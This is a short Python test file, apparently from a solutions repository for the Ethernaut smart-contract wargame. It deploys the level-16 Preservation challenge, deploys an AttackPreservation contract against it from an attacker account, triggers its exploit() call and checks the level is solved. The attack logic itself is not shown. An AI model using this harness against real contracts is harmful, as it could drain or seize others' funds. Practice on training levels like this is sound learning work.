from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv16_preservation import Preservation
from pytypes.contracts.attacker.lv16_preservation import AttackPreservation


@default_chain.connect()
def test_lv15():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv16()
    exploit_lv16(contract, ethernaut.attacker)
    ethernaut.check_lv16(contract)

def exploit_lv16(contract: Preservation, attacker: Account):
    exploitContract = AttackPreservation.deploy(victimContract=contract.address, from_=attacker)
    exploitContract.exploit()